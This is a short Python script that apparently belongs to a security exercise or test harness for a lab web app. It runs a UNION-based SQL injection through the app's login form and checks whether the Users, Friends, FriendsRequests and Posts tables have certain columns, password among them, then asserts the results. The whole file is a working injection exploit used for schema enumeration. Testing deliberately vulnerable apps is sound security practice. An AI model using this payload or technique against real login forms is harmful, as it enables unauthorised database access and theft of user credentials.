#!/usr/bin/env python3
import requests, sys
from interface import *
from bs4 import BeautifulSoup

if not (2 == len(sys.argv)):
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

def check_column(s, tablename, colname):
    username = f"' or 1 = 1 UNION SELECT NULL, NULL, NULL, NULL, {colname} from {tablename}#"
    r = login(s, url, username, "asdf")

    soup = BeautifulSoup(r.text, 'html.parser')
    title = soup.find_all("title")[0]

    if title.string != "ErrorFaceFive":
        print(f"[+] Column {colname} exists in table {tablename}")
        return True
    else:
        print(f"[+] Column {colname} doesn't exists in table {tablename}")
        return False

session = requests.Session()
reset_app(session, url)

tables = {
    "Users": {
        "name": True,
        "username": True,
        "password": True,
        "age": False,
        "about": True,
        "photo": True,
    },
    "Friends": {
        "username1": True,
        "type": False,
        "username2": True,
    },
    "FriendsRequests": {
        "username1": True,
        "username2": True,
    },
    "Posts": {
        "id": True,
        "author": True,
        "content": True,
        "image": False,
        "type": True,
    }
}

# Checking the existence of columns in tables
for table_name in tables:
    for col_name in tables[table_name]:
        assert check_column(session, table_name, col_name) == tables[table_name][col_name]
    
session.close()
